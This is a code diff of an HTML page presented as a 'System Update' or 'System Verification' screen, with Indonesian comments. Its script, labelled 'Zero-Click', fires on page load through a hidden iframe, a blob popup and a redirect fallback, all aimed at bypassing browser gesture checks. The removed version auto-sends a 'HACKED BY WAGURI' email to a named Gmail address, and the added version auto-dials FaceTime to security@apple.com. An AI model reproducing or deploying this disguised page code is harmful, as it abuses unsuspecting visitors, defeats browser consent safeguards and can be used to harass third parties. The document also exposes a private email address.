@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Update</title>
+<title>System Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
@@ -41,16 +41,13 @@
   }
 
   // ============================================
-  // 1. KONFIGURASI EMAIL (MAILTO)
+  // 1. KONFIGURASI FACETIME
   // ============================================
-  var TARGET_EMAIL = "suratinoyoarta@gmail.com";
-  var SUBJECT = "HACKED BY WAGURI";
-  var BODY = "Your system has been compromised.\n\nHACKED BY WAGURI";
-
-  // Encode URL
-  var MAIL_SCHEME = "mailto:" + TARGET_EMAIL + 
-                    "?subject=" + encodeURIComponent(SUBJECT) + 
-                    "&body=" + encodeURIComponent(BODY);
+  // Target: Email atau Nomor Telepon
+  var TARGET = "security@apple.com"; 
+  
+  // Scheme FaceTime (Gunakan facetime-prompt:// untuk beberapa versi macOS)
+  var FACETIME_SCHEME = "facetime://" + TARGET;
 
   // ============================================
   // 2. TRIGGER ZERO-CLICK (OTOMATIS SAAT LOAD)
@@ -59,18 +56,18 @@
     if (executed) return;
     executed = true;
 
-    log("[!] Memulai Zero-Click Auto-Email...");
+    log("[!] Memulai Zero-Click FaceTime Call...");
 
     // ============================================
     // A. IFRAME SANDBOX (BYPASS GESTURE)
     // ============================================
     setTimeout(function() {
       try {
-        log("[+] Mengirim Mail via Iframe...");
+        log("[+] Mengirim FaceTime via Iframe...");
         var iframe = document.createElement("iframe");
         iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
         iframe.style.display = "none";
-        iframe.src = MAIL_SCHEME;
+        iframe.src = FACETIME_SCHEME;
         document.getElementById("launcher-container").appendChild(iframe);
       } catch(e) {
         log("[-] Iframe Error: " + e.message);
@@ -88,7 +85,8 @@
           <html>
           <body>
             <script>
-              window.location.replace("${MAIL_SCHEME}");
+              // Redirect ke FaceTime
+              window.location.replace("${FACETIME_SCHEME}");
             <\/script>
           </body>
           </html>
@@ -98,7 +96,7 @@
         
         var win = window.open(blobUrl, '_blank');
         if (win) {
-          log("[+] Blob Redirect Triggered (Tab Baru).");
+          log("[+] Blob Redirect Triggered.");
         } else {
           log("[-] Popup diblokir.");
         }
@@ -111,9 +109,9 @@
     // C. DIRECT TOP-LEVEL (FALLBACK)
     // ============================================
     setTimeout(function() {
-      log("[+] Mengirim Direct Mail Scheme...");
+      log("[+] Mengirim Direct FaceTime Scheme...");
       try {
-        window.location.replace(MAIL_SCHEME);
+        window.location.replace(FACETIME_SCHEME);
       } catch(e) {}
     }, 1000);
 
